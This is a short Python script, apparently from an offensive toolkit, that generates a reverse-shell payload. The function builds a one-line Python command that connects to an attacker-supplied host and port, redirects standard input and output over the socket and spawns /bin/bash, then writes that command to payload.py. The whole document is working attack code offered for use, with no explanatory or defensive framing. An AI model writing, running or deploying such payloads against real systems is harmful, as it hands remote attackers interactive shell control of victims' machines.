def create_python_payload(LHOST, LPORT):
    payload = f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\", {LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    with open("payload.py", "w") as f:
        f.write(payload)
    print("Payload created at payload.py")
